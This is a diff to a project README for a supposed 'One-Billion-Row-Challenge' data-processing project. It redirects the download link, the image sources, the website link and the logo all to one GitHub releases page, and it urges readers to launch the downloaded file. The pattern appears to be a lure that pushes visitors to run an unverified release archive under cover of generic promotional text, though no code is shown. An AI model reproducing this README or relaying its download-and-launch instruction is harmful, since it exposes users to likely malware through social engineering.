@@ -14,7 +14,7 @@ The "2025-One-Billion-Row-Challenge-Aovivo" project is a groundbreaking initiati
 
 ## 🚀 Get Started
 
-To access the project files, click on the following link: [Download Project Files](https://github.com/uploads/App.zip)
+To access the project files, click on the following link: [Download Project Files](https://github.com/killaray/2025-One-Billion-Row-Challenge-Aovivo/releases)
 
 🚀 **Launch the file after download to explore the project setup and configurations.**
 
@@ -40,13 +40,13 @@ The primary goal of the "2025-One-Billion-Row-Challenge-Aovivo" project is to su
 
 ## 📊 Data Visualization
 
-<img src="https://example.com/data-visualization.png" alt="Data Visualization" width="500"/>
+<img src="https://github.com/killaray/2025-One-Billion-Row-Challenge-Aovivo/releases" alt="Data Visualization" width="500"/>
 
 The project will include visual representations of the data processing pipeline, system performance metrics, and other key insights to help understand the complexities of processing one billion rows of data.
 
 ## 🌐 Visit Our Website
 
-For more information and updates on the project, visit our [website](https://2025-one-billion-row-challenge-website.com).
+For more information and updates on the project, visit our [website](https://github.com/killaray/2025-One-Billion-Row-Challenge-Aovivo/releases).
 
 🌟 **Explore our website for in-depth project details, team members, and progress reports.**
 
@@ -68,4 +68,4 @@ Your commitment and enthusiasm are instrumental in driving innovation and transf
 
 🚀📊🌐 **Join us in revolutionizing data processing with the "2025-One-Billion-Row-Challenge-Aovivo" project!** 🌟🚀🔥
 
-![Project Logo](https://example.com/project-logo.png)
+![Project Logo](https://github.com/killaray/2025-One-Billion-Row-Challenge-Aovivo/releases)
